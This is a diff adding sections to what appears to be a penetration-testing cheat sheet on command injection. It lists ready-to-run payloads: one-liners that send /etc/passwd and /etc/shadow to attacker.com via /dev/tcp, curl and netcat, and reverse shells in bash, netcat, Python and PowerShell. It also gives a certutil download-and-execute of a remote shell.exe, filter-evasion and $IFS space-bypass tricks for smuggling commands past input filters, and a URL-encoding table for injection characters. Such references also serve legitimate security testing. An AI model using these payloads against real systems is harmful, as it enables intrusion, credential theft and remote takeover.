@@ -177,3 +177,114 @@ Start-Sleep -s 10                  # PowerShell sleep
 ```
 
 ---
+
+## Data Exfiltration
+- Methods to extract data from the system.
+### File Reading
+```bash
+cat /etc/passwd > /dev/tcp/attacker.com/4444
+base64 /etc/shadow | curl -d @- http://attacker.com
+```
+### System Enumeration
+```bash
+find / -perm -4000 2>/dev/null
+netstat -an | nc attacker.com 4444
+```
+
+---
+
+## Linux Reverse Shell Payloads
+### Bash Reverse Shell
+```bash
+bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+```
+### Netcat Reverse Shell
+```bash
+nc -e /bin/sh <ATTACKER_IP> 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
+```
+### Python Reverse Shell
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+---
+
+## Windows Reverse Shells
+### PowerShell Reverse Shell
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+### Certutil Download And Execute
+```cmd
+certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
+```
+
+---
+
+# Bypasses
+```bash
+w'h'o'am'i
+w"h"o"am"i
+w\ho\am\i
+
+$(tr "[A-Z]" "[a-z]"<<<"WhOAmI")
+
+$(a="WhOaMI";printf %s "${a,,}")
+
+$(rev<<<'imaohw')
+# Reversed
+```
+
+## Filter Evasion
+```bash
+'cat'</etc/passwd
+
+/???/??t /??c/p??s??
+
+/bin/c?t /etc/p?ssw?
+
+alias ls=whoami;ls
+
+$(echo -e "\x77\x68\x6f\x61\x6d\x69")            # whoami in hex
+```
+
+---
+
+## Space Bypass
+### Using $IFS Variable
+```bash
+127.0.0.1${IFS}whoami        # Runs 'whoami'
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+```
+
+## Line Feed / Tabs
+```bash
+cat</etc/passwd
+
+cat$'\x20'/etc/passwd
+```
+
+## Brace Expansion
+```bash
+{cat,/etc/passwd}
+
+X=$'cat\x20/etc/passwd'&&$X
+```
+
+---
+
+# URL Encoding Reference
+
+| Injection Character | URL-Encoded Character |
+|---------------------|-----------------------|
+| ;                   | %3b                   |
+| \n                  | %0a                   |
+| &                   | %26                   |
+| \|                  | %7c                   |
+| &&                  | %26%26                |
+| \|\|                | %7c%7c                |
+| `                   | %60                   |
+| $()                 | %24%28%29             |
